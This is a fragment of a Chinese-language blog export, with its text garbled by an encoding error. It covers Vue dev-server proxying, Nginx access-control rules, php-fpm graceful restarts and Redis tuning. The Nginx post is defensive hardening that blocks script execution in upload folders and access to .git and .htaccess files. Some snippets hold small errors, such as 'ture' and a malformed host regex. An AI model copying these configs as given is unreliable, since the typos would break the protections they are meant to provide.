class="attr">devServer</span>: &#123;</span><br><span class="line">    <span class="attr">proxy</span>: &#123;</span><br><span class="line">      <span class="string">&#x27;/api&#x27;</span>: &#123;</span><br><span class="line">        <span class="attr">target</span>: <span class="string">&#x27;&lt;url&gt;&#x27;</span>,</span><br><span class="line">        <span class="attr">ws</span>: <span class="literal">true</span>,</span><br><span class="line">        <span class="attr">changeOrigin</span>: <span class="literal">true</span></span><br><span class="line">        <span class="attr">pathRewrite</span>: &#123;</span><br><span class="line">            <span class="string">&#x27;^/api&#x27;</span>: <span class="string">&#x27;&#x27;</span></span><br><span class="line">        &#125;</span><br><span class="line">      &#125;,</span><br><span class="line">      <span class="string">&#x27;/foo&#x27;</span>: &#123;</span><br><span class="line">        <span class="attr">target</span>: <span class="string">&#x27;&lt;other_url&gt;&#x27;</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ›´å¤šçš„ä»£ç†æ§åˆ¶è¡Œä¸ºï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨ä¸€ä¸ª path: options æˆå¯¹çš„å¯¹è±¡ã€‚å®Œæ•´çš„é€‰é¡¹å¯ä»¥æŸ¥é˜… <a href="https://github.com/chimurai/http-proxy-middleware#proxycontext-config">http-proxy-middleware</a> ã€‚</p><h3 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h3><p>ä»¥ä¸Šå‡å‡ºè‡ªå®˜æ–¹æ–‡æ¡£ï¼Œå‘ç°å¾ˆå¤šäººä¸çŸ¥é“çœ‹vueé…ç½®æ–‡æ¡£ï¼Œç™¾åˆ†ä¹‹å…«åçš„é—®é¢˜éƒ½å¯ä»¥é€šè¿‡æ–‡æ¡£è§£å†³</p>]]></content>
      
      
      <categories>
          
          <category> vue </category>
          
      </categories>
      
      
        <tags>
            
            <tag> vue </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Nginxè®¿é—®æ§åˆ¶</title>
      <link href="post/16692/"/>
      <url>post/16692/</url>
      
        <content type="html"><![CDATA[<h3 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h3><p>æœ‰æ—¶ï¼Œç½‘ç«™ä¼šè¢«æ¶æ„å…¥ä¾µï¼Œå¯ç”¨Nginxåšä¸€äº›è®¿é—®æ§åˆ¶ï¼ŒåŠ å¼ºä¸€äº›ç½‘ç«™å®‰å…¨æ€§</p><span id="more"></span><h3 id="æ‰©å±•åé™åˆ¶"><a href="#æ‰©å±•åé™åˆ¶" class="headerlink" title="æ‰©å±•åé™åˆ¶"></a>æ‰©å±•åé™åˆ¶</h3><p>ç¦æ­¢è®¿é—®æŒ‡å®šç›®å½•ä¸‹çš„ç¨‹åº</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">location ~ ^/images/.*\.(php|py)$</span><br><span class="line">&#123;</span><br><span class="line">    deny all;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>ç¦æ­¢è®¿é—®æŒ‡å®šæ–‡ä»¶åç¨‹åº</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">location ~ ^/data/(attachment|avatar).*\.(php|py)$</span><br><span class="line">&#123;</span><br><span class="line">    deny all;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="æ–‡ä»¶æˆ–ç›®å½•é™åˆ¶"><a href="#æ–‡ä»¶æˆ–ç›®å½•é™åˆ¶" class="headerlink" title="æ–‡ä»¶æˆ–ç›®å½•é™åˆ¶"></a>æ–‡ä»¶æˆ–ç›®å½•é™åˆ¶</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">location ~ ^/(\.user.ini|\.htaccess|\.git|\.svn|\.project|LICENSE|README.md) &#123;</span><br><span class="line">    return 404;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ’é™¤æŸä¸ªç›®å½•ä¸å—é™åˆ¶</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">location ~ \.well-known&#123;</span><br><span class="line">    allow all;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç¦æ­¢è®¿é—®å•ä¸ªç›®å½•</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">location ~ ^/static &#123;</span><br><span class="line">    deny all;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç¦æ­¢è®¿é—®å¤šä¸ªç›®å½•ï¼Œå¹¶è¿”å›æŒ‡å®šçŠ¶æ€ç </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">location ~ ^/(static|js) &#123;</span><br><span class="line">    return 404;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="é™åˆ¶IPè®¿é—®"><a href="#é™åˆ¶IPè®¿é—®" class="headerlink" title="é™åˆ¶IPè®¿é—®"></a>é™åˆ¶IPè®¿é—®</h3><p>ç¦æ­¢ç›®å½•è®¿é—®ï¼Œä½†å…è®¸æŸIPè®¿é—®</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">location ~ ^/mysql_loging/ &#123;</span><br><span class="line">    allow 192.168.0.4;</span><br><span class="line">    deny all;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>é™åˆ¶IPæˆ–IPæ®µè®¿é—®</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">location / &#123;</span><br><span class="line">    deny 192.168.0.4;</span><br><span class="line">    allow 192.168.1.0/16;</span><br><span class="line">    allow 10.0.0.0/24;</span><br><span class="line">    deny all;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>nginxåšåå‘ä»£ç†çš„æ—¶å€™ä¹Ÿå¯ä»¥é™åˆ¶å®¢æˆ·ç«¯IP</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">if ( $remoteaddr = 10.0.0.7 ) &#123;</span><br><span class="line">    return 403;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if ( $remoteaddr = 218.247.17.130 ) &#123;</span><br><span class="line">    set $allow_access_root &#x27;ture&#x27;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç¦æ­¢æŸipæ®µè®¿é—®å¹¶å‘æµè§ˆå™¨è¾“å‡ºä¸€æ®µæ–‡å­—ï¼ˆè‹¥æœ‰ä¹±ç ,è¯·åœ¨serverä¸­æ·»åŠ ï¼šcharset utf-8;ï¼‰</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">if ($remote_addr ~* ^211\.149\.(.*?)\.(.*?)$)&#123;</span><br><span class="line">return 404 &quot;é»‘åå•ç”¨æˆ·ï¼Œæ‹’ç»è®¿é—®&quot;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="ç¦æ­¢éæ³•åŸŸåè§£æè®¿é—®"><a href="#ç¦æ­¢éæ³•åŸŸåè§£æè®¿é—®" class="headerlink" title="ç¦æ­¢éæ³•åŸŸåè§£æè®¿é—®"></a>ç¦æ­¢éæ³•åŸŸåè§£æè®¿é—®</h3><p>è®©ä½¿ç”¨IPè®¿é—®ç½‘ç«™çš„ç”¨æˆ·ï¼Œæˆ–æ¶æ„æ¥å¸åŸŸåçš„ç”¨æˆ·ï¼Œæ”¶åˆ°501é”™è¯¯</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">server &#123;</span><br><span class="line">    listen 80 default_server;</span><br><span class="line">    server_name _;</span><br><span class="line">    return 501;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>é€šè¿‡301è·³è½¬ä¸»é¡µ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">server &#123;</span><br><span class="line">    listen 80 default_server;</span><br><span class="line">    server_name _;</span><br><span class="line">    rewrite ^(.*) http://blog.dns.com/$1 permanent;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å‘ç°æŸåŸŸåæ¶æ„è§£æåˆ°å…¬å¸çš„æœåŠ¡å™¨IPï¼Œåœ¨serveræ ‡ç­¾é‡Œæ·»åŠ ä»¥ä¸‹ä»£ç å³å¯ï¼Œè‹¥æœ‰å¤šä¸ªserverè¦å¤šå¤„æ·»åŠ </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">if ($host !~ ^www/.tag/.com$) &#123;</span><br><span class="line">    rewrite ^(.*) http://blog.mydns.vip$1 permanent;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> nginx </category>
          
      </categories>
      
      
        <tags>
            
            <tag> nginx </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>å¹³æ»‘é‡å¯php-fpm</title>
      <link href="post/52587/"/>
      <url>post/52587/</url>
      
        <content type="html"><![CDATA[<h3 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h3><p>php-fpm ä¼šå¯¹ä¸‹é¢å‡ ä¸ªä¿¡å·ä½œï¼ˆè‡ªå·±çš„ï¼‰å¤„ç†</p><ul><li>SIGINT, SIGTERM: immediate termination</li><li>SIGQUIT: graceful stop</li><li>SIGUSR1: re-open log file</li><li>SIGUSR2: graceful reload of all workers + reload of fpm conf/binary</li></ul><span id="more"></span><h3 id="ç†è§£"><a href="#ç†è§£" class="headerlink" title="ç†è§£"></a>ç†è§£</h3><p>masterè¿›ç¨‹å¯ä»¥ç†è§£ä»¥ä¸‹ä¿¡å·</p><ul><li>INT ï¼ˆ2ï¼‰, TERMï¼ˆ15ï¼‰ ç«‹åˆ»ç»ˆæ­¢</li><li>QUIT ï¼ˆ3ï¼‰ å¹³æ»‘ç»ˆæ­¢</li><li>USR1 é‡æ–°æ‰“å¼€æ—¥å¿—æ–‡ä»¶</li><li>USR2 å¹³æ»‘é‡è½½æ‰€æœ‰workerè¿›ç¨‹å¹¶é‡æ–°è½½å…¥é…ç½®å’ŒäºŒè¿›åˆ¶æ¨¡å—</li></ul><h4 id="æŸ¥çœ‹è¿›ç¨‹æ•°"><a href="#æŸ¥çœ‹è¿›ç¨‹æ•°" class="headerlink" title="æŸ¥çœ‹è¿›ç¨‹æ•°"></a>æŸ¥çœ‹è¿›ç¨‹æ•°</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ps aux | grep -c php-fpm</span><br></pre></td></tr></table></figure><h4 id="æŸ¥çœ‹masterè¿›ç¨‹å·"><a href="#æŸ¥çœ‹masterè¿›ç¨‹å·" class="headerlink" title="æŸ¥çœ‹masterè¿›ç¨‹å·"></a>æŸ¥çœ‹masterè¿›ç¨‹å·</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ps aux|grep <span class="string">&#x27;php-fpm: master&#x27;</span> | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span></span><br></pre></td></tr></table></figure><h4 id="å¹³æ»‘é‡å¯"><a href="#å¹³æ»‘é‡å¯" class="headerlink" title="å¹³æ»‘é‡å¯"></a>å¹³æ»‘é‡å¯</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">kill</span> -USR2 `cat /usr/<span class="built_in">local</span>/php/var/run/php-fpm.pid`</span><br></pre></td></tr></table></figure><p>OR</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">kill</span> -USR2 [pid]</span><br></pre></td></tr></table></figure><h3 id="è„šæœ¬å®ç°"><a href="#è„šæœ¬å®ç°" class="headerlink" title="è„šæœ¬å®ç°"></a>è„šæœ¬å®ç°</h3><h4 id="centosè„šæœ¬å®ç°"><a href="#centosè„šæœ¬å®ç°" class="headerlink" title="centosè„šæœ¬å®ç°"></a>centosè„šæœ¬å®ç°</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;php-fpm is reloading....&quot;</span></span><br><span class="line">PID=`ps aux | grep php-fpm | grep <span class="string">&quot;master&quot;</span> |awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span>`</span><br><span class="line"></span><br><span class="line">[ <span class="variable">$PID</span> ] &amp;&amp; <span class="built_in">kill</span> -USR2 <span class="variable">$PID</span> || <span class="built_in">echo</span> <span class="string">&quot;php-fpm is useing(pid=<span class="variable">$PID</span>)&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;reload done!&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;php-fpm is reload...&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;reload done!&quot;</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> php </category>
          
      </categories>
      
      
        <tags>
            
            <tag> php </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Redisæ€§èƒ½ä¼˜åŒ–æ•´ç†</title>
      <link href="post/33866/"/>
      <url>post/33866/</url>
      
        <content type="html"><![CDATA[<h3 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h3><p>Redis æ˜¯åŸºäºå•çº¿ç¨‹æ¨¡å‹å®ç°çš„ï¼Œä¹Ÿå°±æ˜¯ Redis æ˜¯ä½¿ç”¨ä¸€ä¸ªçº¿ç¨‹æ¥å¤„ç†æ‰€æœ‰çš„å®¢æˆ·ç«¯è¯·æ±‚çš„ï¼Œå°½ç®¡ Redis ä½¿ç”¨äº†éé˜»å¡å¼ IOï¼Œå¹¶ä¸”å¯¹å„ç§å‘½ä»¤éƒ½åšäº†ä¼˜åŒ–ï¼ˆå¤§éƒ¨åˆ†å‘½ä»¤æ“ä½œæ—¶é—´å¤æ‚åº¦éƒ½æ˜¯ O(1)ï¼‰ï¼Œä½†ç”±äº Redis æ˜¯å•çº¿ç¨‹æ‰§è¡Œçš„ç‰¹ç‚¹ï¼Œå› æ­¤å®ƒå¯¹æ€§èƒ½çš„è¦æ±‚æ›´åŠ è‹›åˆ»ã€‚</p><span id="more"></span><h3 id="å¼€å¯-lazy-free-ç‰¹æ€§"><a href="#å¼€å¯-lazy-free-ç‰¹æ€§" class="headerlink" title="å¼€å¯ lazy free ç‰¹æ€§"></a>å¼€å¯ lazy free ç‰¹æ€§</h3><p>lazy free ç‰¹æ€§æ˜¯ Redis 4.0 æ–°å¢çš„ä¸€ä¸ªéå¸¸ä½¿ç”¨çš„åŠŸèƒ½ï¼Œå®ƒå¯ä»¥ç†è§£ä¸ºæƒ°æ€§åˆ é™¤æˆ–å»¶è¿Ÿåˆ é™¤ã€‚æ„æ€æ˜¯åœ¨åˆ é™¤çš„æ—¶å€™æä¾›å¼‚æ­¥å»¶æ—¶é‡Šæ”¾é”®å€¼çš„åŠŸèƒ½ï¼ŒæŠŠé”®å€¼é‡Šæ”¾æ“ä½œæ”¾åœ¨ BIO(Background I/O) å•ç‹¬çš„å­çº¿ç¨‹å¤„ç†ä¸­ï¼Œä»¥å‡å°‘åˆ é™¤åˆ é™¤å¯¹ Redis ä¸»çº¿ç¨‹çš„é˜»å¡ï¼Œå¯ä»¥æœ‰æ•ˆåœ°é¿å…åˆ é™¤ big key æ—¶å¸¦æ¥çš„æ€§èƒ½å’Œå¯ç”¨æ€§é—®é¢˜ã€‚</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">lazyfree-lazy-eviction no</span><br><span class="line">lazyfree-lazy-expire no</span><br><span class="line">lazyfree-lazy-server-del no</span><br><span class="line">slave-lazy-flush no</span><br></pre></td></tr></table></figure><ul><li>lazyfree-lazy-evictionï¼šè¡¨ç¤ºå½“ Redis è¿è¡Œå†…å­˜è¶…è¿‡ maxmeory æ—¶ï¼Œæ˜¯å¦å¼€å¯ lazy free æœºåˆ¶åˆ é™¤ï¼›</li><li>lazyfree-lazy-expireï¼šè¡¨ç¤ºè®¾ç½®äº†è¿‡æœŸæ—¶é—´çš„é”®å€¼ï¼Œå½“è¿‡æœŸä¹‹åæ˜¯å¦å¼€å¯ lazy free æœºåˆ¶åˆ é™¤ï¼›</li><li>lazyfree-lazy-server-delï¼šæœ‰äº›æŒ‡ä»¤åœ¨å¤„ç†å·²å­˜åœ¨çš„é”®æ—¶ï¼Œä¼šå¸¦æœ‰ä¸€ä¸ªéšå¼çš„ del é”®çš„æ“ä½œï¼Œæ¯”å¦‚ rename å‘½ä»¤ï¼Œå½“ç›®æ ‡é”®å·²å­˜åœ¨ï¼ŒRedis ä¼šå…ˆåˆ é™¤ç›®æ ‡é”®ï¼Œå¦‚æœè¿™äº›ç›®æ ‡é”®æ˜¯ä¸€ä¸ª big keyï¼Œå°±ä¼šé€ æˆé˜»å¡åˆ é™¤çš„é—®é¢˜ï¼Œæ­¤é…ç½®è¡¨ç¤ºåœ¨è¿™ç§åœºæ™¯ä¸­æ˜¯å¦å¼€å¯ lazy free æœºåˆ¶åˆ é™¤ï¼›</li><li>slave-lazy-flushï¼šé’ˆå¯¹ slave(ä»èŠ‚ç‚¹) è¿›è¡Œå…¨é‡æ•°æ®åŒæ­¥ï¼Œslave åœ¨åŠ è½½ master çš„ RDB æ–‡ä»¶å‰ï¼Œä¼šè¿è¡Œ flushall æ¥æ¸…ç†è‡ªå·±çš„æ•°æ®ï¼Œå®ƒè¡¨ç¤ºæ­¤æ—¶æ˜¯å¦å¼€å¯ lazy free æœºåˆ¶åˆ é™¤ã€‚</li></ul><p>å¼€å¯å…¶ä¸­çš„ lazyfree-lazy-evictionã€lazyfree-lazy-expireã€lazyfree-lazy-server-del ç­‰é…ç½®ï¼Œè¿™æ ·å°±å¯ä»¥æœ‰æ•ˆçš„æé«˜ä¸»çº¿ç¨‹çš„æ‰§è¡Œæ•ˆç‡ã€‚</p><h3 id="ä½¿ç”¨-slowlog-ä¼˜åŒ–è€—æ—¶å‘½ä»¤"><a href="#ä½¿ç”¨-slowlog-ä¼˜åŒ–è€—æ—¶å‘½ä»¤" class="headerlink" title="ä½¿ç”¨ slowlog ä¼˜åŒ–è€—æ—¶å‘½ä»¤"></a>ä½¿ç”¨ slowlog ä¼˜åŒ–è€—æ—¶å‘½ä»¤</h3><p>å¯ä»¥ä½¿ç”¨ slowlog åŠŸèƒ½æ‰¾å‡ºæœ€è€—æ—¶çš„ Redis å‘½ä»¤è¿›è¡Œç›¸å…³çš„ä¼˜åŒ–ï¼Œä»¥æå‡ Redis çš„è¿è¡Œé€Ÿåº¦ï¼Œæ…¢æŸ¥è¯¢æœ‰ä¸¤ä¸ªé‡è¦çš„é…ç½®é¡¹ï¼š</p><ul><li>slowlog-log-slower-than ï¼šç”¨äºè®¾ç½®æ…¢æŸ¥è¯¢çš„è¯„å®šæ—¶é—´ï¼Œä¹Ÿå°±æ˜¯è¯´è¶…è¿‡æ­¤é…ç½®é¡¹çš„å‘½ä»¤ï¼Œå°†ä¼šè¢«å½“æˆæ…¢æ“ä½œè®°å½•åœ¨æ…¢æŸ¥è¯¢æ—¥å¿—ä¸­ï¼Œå®ƒæ‰§è¡Œå•ä½æ˜¯å¾®ç§’ (1 ç§’ç­‰äº 1000000 å¾®ç§’)ï¼›</li><li>slowlog-max-len ï¼šç”¨æ¥é…ç½®æ…¢æŸ¥è¯¢æ—¥å¿—çš„æœ€å¤§è®°å½•æ•°ã€‚</li></ul><p>å¯ä»¥æ ¹æ®å®é™…çš„ä¸šåŠ¡æƒ…å†µè¿›è¡Œç›¸åº”çš„é…ç½®ï¼Œå…¶ä¸­æ…¢æ—¥å¿—æ˜¯æŒ‰ç…§æ’å…¥çš„é¡ºåºå€’åºå­˜å…¥æ…¢æŸ¥è¯¢æ—¥å¿—ä¸­ï¼Œå¯ä»¥ä½¿ç”¨ slowlog get n æ¥è·å–ç›¸å…³çš„æ…¢æŸ¥è¯¢æ—¥å¿—ï¼Œå†æ‰¾åˆ°è¿™äº›æ…¢æŸ¥è¯¢å¯¹åº”çš„ä¸šåŠ¡è¿›è¡Œç›¸å…³çš„ä¼˜åŒ–ã€‚</p><h3 id="ä½¿ç”¨-Pipeline-æ‰¹é‡æ“ä½œæ•°æ®"><a href="#ä½¿ç”¨-Pipeline-æ‰¹é‡æ“ä½œæ•°æ®" class="headerlink" title="ä½¿ç”¨ Pipeline æ‰¹é‡æ“ä½œæ•°æ®"></a>ä½¿ç”¨ Pipeline æ‰¹é‡æ“ä½œæ•°æ®</h3><p>Pipeline (ç®¡é“æŠ€æœ¯) æ˜¯å®¢æˆ·ç«¯æä¾›çš„ä¸€ç§æ‰¹å¤„ç†æŠ€æœ¯ï¼Œç”¨äºä¸€æ¬¡å¤„ç†å¤šä¸ª Redis å‘½ä»¤ï¼Œä»è€Œæé«˜æ•´ä¸ªäº¤äº’çš„æ€§èƒ½ã€‚</p><h3 id="é¿å…å¤§é‡æ•°æ®åŒæ—¶å¤±æ•ˆ"><a href="#é¿å…å¤§é‡æ•°æ®åŒæ—¶å¤±æ•ˆ" class="headerlink" title="é¿å…å¤§é‡æ•°æ®åŒæ—¶å¤±æ•ˆ"></a>é¿å…å¤§é‡æ•°æ®åŒæ—¶å¤±æ•ˆ</h3><p>Redis è¿‡æœŸé”®å€¼åˆ é™¤ä½¿ç”¨çš„æ˜¯è´ªå¿ƒç­–ç•¥ï¼Œå®ƒæ¯ç§’ä¼šè¿›è¡Œ 10 æ¬¡è¿‡æœŸæ‰«æï¼Œæ­¤é…ç½®å¯åœ¨ redis.conf è¿›è¡Œé…ç½®ï¼Œé»˜è®¤å€¼æ˜¯ hz 10ï¼ŒRedis ä¼šéšæœºæŠ½å– 20 ä¸ªå€¼ï¼Œåˆ é™¤è¿™ 20 ä¸ªé”®ä¸­è¿‡æœŸçš„é”®ï¼Œå¦‚æœè¿‡æœŸ key çš„æ¯”ä¾‹è¶…è¿‡ 25% ï¼Œé‡å¤æ‰§è¡Œæ­¤æµç¨‹ã€‚</p><p>å¦‚æœåœ¨å¤§å‹ç³»ç»Ÿä¸­æœ‰å¤§é‡ç¼“å­˜åœ¨åŒä¸€æ—¶é—´åŒæ—¶è¿‡æœŸï¼Œé‚£ä¹ˆä¼šå¯¼è‡´ Redis å¾ªç¯å¤šæ¬¡æŒç»­æ‰«æåˆ é™¤è¿‡æœŸå­—å…¸ï¼Œç›´åˆ°è¿‡æœŸå­—å…¸ä¸­è¿‡æœŸé”®å€¼è¢«åˆ é™¤çš„æ¯”è¾ƒç¨€ç–ä¸ºæ­¢ï¼Œè€Œåœ¨æ•´ä¸ªæ‰§è¡Œè¿‡ç¨‹ä¼šå¯¼è‡´ Redis çš„è¯»å†™å‡ºç°æ˜æ˜¾çš„å¡é¡¿ï¼Œå¡é¡¿çš„å¦ä¸€ç§åŸå› æ˜¯å†…å­˜ç®¡ç†å™¨éœ€è¦é¢‘ç¹å›æ”¶å†…å­˜é¡µï¼Œå› æ­¤ä¹Ÿä¼šæ¶ˆè€—ä¸€å®šçš„ CPUã€‚<br>ä¸ºäº†é¿å…è¿™ç§å¡é¡¿ç°è±¡çš„äº§ç”Ÿï¼Œæˆ‘ä»¬éœ€è¦é¢„é˜²å¤§é‡çš„ç¼“å­˜åœ¨åŒä¸€æ—¶åˆ»ä¸€èµ·è¿‡æœŸï¼Œå°±ç®€å•çš„è§£å†³æ–¹æ¡ˆå°±æ˜¯åœ¨è¿‡æœŸæ—¶é—´çš„åŸºç¡€ä¸Šæ·»åŠ ä¸€ä¸ªæŒ‡å®šèŒƒå›´çš„éšæœºæ•°ã€‚</p><h3 id="è¿æ¥æ± "><a href="#è¿æ¥æ± " class="headerlink" title="è¿æ¥æ± "></a>è¿æ¥æ± </h3><p>å°½é‡ä½¿ç”¨ Redis è¿æ¥æ± ï¼Œè€Œä¸æ˜¯é¢‘ç¹åˆ›å»ºé”€æ¯ Redis è¿æ¥ï¼Œè¿™æ ·å°±å¯ä»¥å‡å°‘ç½‘ç»œä¼ è¾“æ¬¡æ•°å’Œå‡å°‘äº†éå¿…è¦è°ƒç”¨æŒ‡ä»¤ã€‚</p><h3 id="é™åˆ¶-Redis-å†…å­˜å¤§å°"><a href="#é™åˆ¶-Redis-å†…å­˜å¤§å°" class="headerlink" title="é™åˆ¶ Redis å†…å­˜å¤§å°"></a>é™åˆ¶ Redis å†…å­˜å¤§å°</h3><p>åœ¨ 64 ä½æ“ä½œç³»ç»Ÿä¸­ Redis çš„å†…å­˜å¤§å°æ˜¯æ²¡æœ‰é™åˆ¶çš„ï¼Œä¹Ÿå°±æ˜¯é…ç½®é¡¹ <code>maxmemory &lt;bytes&gt;</code> æ˜¯è¢«æ³¨é‡Šæ‰çš„ï¼Œè¿™æ ·å°±ä¼šå¯¼è‡´åœ¨ç‰©ç†å†…å­˜ä¸è¶³æ—¶ï¼Œä½¿ç”¨ swap ç©ºé—´æ—¢äº¤æ¢ç©ºé—´ï¼Œè€Œå½“æ“å¿ƒç³»ç»Ÿå°† Redis æ‰€ç”¨çš„å†…å­˜åˆ†é¡µç§»è‡³ swap ç©ºé—´æ—¶ï¼Œå°†ä¼šé˜»å¡ Redis è¿›ç¨‹ï¼Œå¯¼è‡´ Redis å‡ºç°å»¶è¿Ÿï¼Œä»è€Œå½±å“ Redis çš„æ•´ä½“æ€§èƒ½ã€‚</p><p>å› æ­¤éœ€è¦é™åˆ¶ Redis çš„å†…å­˜å¤§å°ä¸ºä¸€ä¸ªå›ºå®šçš„å€¼ï¼Œå½“ Redis çš„è¿è¡Œåˆ°è¾¾æ­¤å€¼æ—¶ä¼šè§¦å‘å†…å­˜æ·˜æ±°ç­–ç•¥ï¼Œå†…å­˜æ·˜æ±°ç­–ç•¥åœ¨ Redis 4.0 ä¹‹åæœ‰ 8 ç§ï¼š</p><ul><li>noevictionï¼šä¸æ·˜æ±°ä»»ä½•æ•°æ®ï¼Œå½“å†…å­˜ä¸è¶³æ—¶ï¼Œæ–°å¢æ“ä½œä¼šæŠ¥é”™ï¼ŒRedis é»˜è®¤å†…å­˜æ·˜æ±°ç­–ç•¥ï¼›</li><li>allkeys-lruï¼šæ·˜æ±°æ•´ä¸ªé”®å€¼ä¸­æœ€ä¹…æœªä½¿ç”¨çš„é”®å€¼ï¼›</li><li>allkeys-randomï¼šéšæœºæ·˜æ±°ä»»æ„é”®å€¼;</li><li>volatile-lruï¼šæ·˜æ±°æ‰€æœ‰è®¾ç½®äº†è¿‡æœŸæ—¶é—´çš„é”®å€¼ä¸­æœ€ä¹…æœªä½¿ç”¨çš„é”®å€¼ï¼›</li><li>volatile-randomï¼šéšæœºæ·˜æ±°è®¾ç½®äº†è¿‡æœŸæ—¶é—´çš„ä»»æ„é”®å€¼ï¼›</li><li>volatile-ttlï¼šä¼˜å…ˆæ·˜æ±°æ›´æ—©è¿‡æœŸçš„é”®å€¼ã€‚</li></ul><p>åœ¨ Redis 4.0Â ç‰ˆæœ¬ä¸­åˆæ–°å¢äº† 2 ç§æ·˜æ±°ç­–ç•¥ï¼š</p><ul><li>volatile-lfuï¼šæ·˜æ±°æ‰€æœ‰è®¾ç½®äº†è¿‡æœŸæ—¶é—´çš„é”®å€¼ä¸­ï¼Œæœ€å°‘ä½¿ç”¨çš„é”®å€¼ï¼›</li><li>allkeys-lfuï¼šæ·˜æ±°æ•´ä¸ªé”®å€¼ä¸­æœ€å°‘ä½¿ç”¨çš„é”®å€¼ã€‚</li></ul><p>å…¶ä¸­Â allkeys-xxxÂ è¡¨ç¤ºä»æ‰€æœ‰çš„é”®å€¼ä¸­æ·˜æ±°æ•°æ®ï¼Œè€ŒÂ volatile-xxxÂ 